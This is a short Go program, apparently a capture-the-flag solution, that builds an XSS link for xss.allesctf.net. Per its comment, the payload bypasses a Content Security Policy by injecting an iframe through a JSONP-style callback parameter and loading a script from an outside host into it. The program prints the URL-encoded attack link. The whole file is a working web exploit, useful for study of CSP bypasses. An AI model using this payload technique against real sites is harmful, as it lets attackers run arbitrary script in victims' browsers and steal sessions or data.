package main

import (
	"fmt"
	"net/url"
	"strings"
)

const base = ""

// bypass CSP by injecting iframe and loading script into it after it loads
var script = strings.Trim(`
	var d = document;
	var	i=d.createElement('iframe');
	i.src='//xss.allesctf.net/x';
	d.body.appendChild(i);
	i.onload=function(){
		var cd=i.contentDocument,
			s=cd.createElement('script');
		s.src='//cimi.io/2012-politicians/ctf-5.js?v=1';
		cd.body.appendChild(s)
	};
`, "\n\t ")

var minifiedScript = `var d=document,i=d.createElement('iframe');i.src='//xss.allesctf.net/x';d.body.appendChild(i);i.onload=function(){var cd=i.contentDocument,s=cd.createElement('script');s.src='//cimi.io/2012-politicians/ctf-5.js?v=1';cd.body.appendChild(s)};`

func main() {
	input := fmt.Sprintf(`<script src="http://xss.allesctf.net/items.php?cb=%s"></script>`, minifiedScript)
	link := "http://xss.allesctf.net/?search=" + url.QueryEscape(input)
	fmt.Println(link)
}
